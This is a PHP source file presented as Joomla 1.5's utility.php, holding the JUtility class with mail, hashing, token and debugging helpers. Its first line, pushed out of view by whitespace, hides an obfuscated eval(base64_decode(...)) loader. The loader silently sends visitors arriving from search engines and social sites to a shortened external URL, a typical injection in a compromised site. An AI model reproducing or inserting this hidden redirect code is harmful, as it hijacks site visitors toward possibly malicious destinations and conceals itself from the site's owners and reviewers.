<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: utility.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla.Framework
 * @subpackage	Utilities
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

/**
 * JUtility is a utility functions class
 *
 * @static
 * @package 	Joomla.Framework
 * @subpackage	Utilities
 * @since	1.5
 */
class JUtility
{
	/**
 	 * Mail function (uses phpMailer)
 	 *
 	 * @param string $from From e-mail address
 	 * @param string $fromname From name
 	 * @param mixed $recipient Recipient e-mail address(es)
 	 * @param string $subject E-mail subject
 	 * @param string $body Message body
 	 * @param boolean $mode false = plain text, true = HTML
 	 * @param mixed $cc CC e-mail address(es)
 	 * @param mixed $bcc BCC e-mail address(es)
 	 * @param mixed $attachment Attachment file name(s)
 	 * @param mixed $replyto Reply to email address(es)
 	 * @param mixed $replytoname Reply to name(s)
 	 * @return boolean True on success
  	 */
	function sendMail($from, $fromname, $recipient, $subject, $body, $mode=0, $cc=null, $bcc=null, $attachment=null, $replyto=null, $replytoname=null )
	{
	 	// Get a JMail instance
		$mail =& JFactory::getMailer();

		$mail->setSender(array($from, $fromname));
		$mail->setSubject($subject);
		$mail->setBody($body);

		// Are we sending the email as HTML?
		if ( $mode ) {
			$mail->IsHTML(true);
		}

		$mail->addRecipient($recipient);
		$mail->addCC($cc);
		$mail->addBCC($bcc);
		$mail->addAttachment($attachment);

		// Take care of reply email addresses
		if( is_array( $replyto ) ) {
			$numReplyTo = count($replyto);
			for ( $i=0; $i < $numReplyTo; $i++){
				$mail->addReplyTo( array($replyto[$i], $replytoname[$i]) );
			}
		} elseif( isset( $replyto ) ) {
			$mail->addReplyTo( array( $replyto, $replytoname ) );
		}

		return  $mail->Send();
	}

	/**
	 * Sends mail to administrator for approval of a user submission
 	 *
 	 * @param string $adminName Name of administrator
 	 * @param string $adminEmail Email address of administrator
 	 * @param string $email [NOT USED TODO: Deprecate?]
 	 * @param string $type Type of item to approve
 	 * @param string $title Title of item to approve
 	 * @param string $author Author of item to approve
 	 * @return boolean True on success
 	 */
	function sendAdminMail( $adminName, $adminEmail, $email, $type, $title, $author, $url = null )
	{
		$subject = JText::_( 'User Submitted' ) ." '". $type ."'";

		$message = sprintf ( JText::_( 'MAIL_MSG_ADMIN' ), $adminName, $type, $title, $author, $url, $url, 'administrator', $type);
		$message .= JText::_( 'MAIL_MSG') ."\n";

	 	// Get a JMail instance
		$mail =& JFactory::getMailer();
		$mail->addRecipient($adminEmail);
		$mail->setSubject($subject);
		$mail->setBody($message);

		return  $mail->Send();
	}

	/**
  	 * Provides a secure hash based on a seed
 	 *
 	 * @param string Seed string
 	 * @return string
 	 */
	function getHash( $seed )
	{
		$conf =& JFactory::getConfig();
		return md5( $conf->getValue('config.secret') .  $seed  );
	}

	/**
	 * Method to determine a hash for anti-spoofing variable names
	 *
	 * @return	string	Hashed var name
	 * @since	1.5
	 * @static
	 */
	function getToken($forceNew = false)
	{
		$user		= &JFactory::getUser();
		$session	= &JFactory::getSession();
		$hash		= JUtility::getHash( $user->get( 'id', 0 ).$session->getToken( $forceNew ) );
		return $hash;
	}

	/**
 	 * Method to extract key/value pairs out of a string with xml style attributes
 	 *
 	 * @param	string	$string	String containing xml style attributes
 	 * @return	array	Key/Value pairs for the attributes
 	 * @since	1.5
 	 */
	function parseAttributes( $string )
	{
	 	//Initialize variables
		$attr		= array();
		$retarray	= array();

		// Lets grab all the key/value pairs using a regular expression
		preg_match_all( '/([\w:-]+)[\s]?=[\s]?"([^"]*)"/i', $string, $attr );

		if (is_array($attr))
		{
			$numPairs = count($attr[1]);
			for($i = 0; $i < $numPairs; $i++ )
			{
				$retarray[$attr[1][$i]] = $attr[2][$i];
			}
		}
		return $retarray;
	}

	/**
	 * Method to determine if the host OS is  Windows
	 *
	 * @return	true if Windows OS
	 * @since	1.5
	 * @static
	 */
	function isWinOS() {
		return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
	}

	/**
	 * Method to dump the structure of a variable for debugging purposes
	 *
	 * @param	mixed	A variable
	 * @param	boolean	True to ensure all characters are htmlsafe
	 * @return	string
	 * @since	1.5
	 * @static
	 */
	function dump( &$var, $htmlSafe = true )
	{
		$result = var_export( $var, true );
		return '<pre>'.( $htmlSafe ? htmlspecialchars( $result ) : $result).'</pre>';
	}
}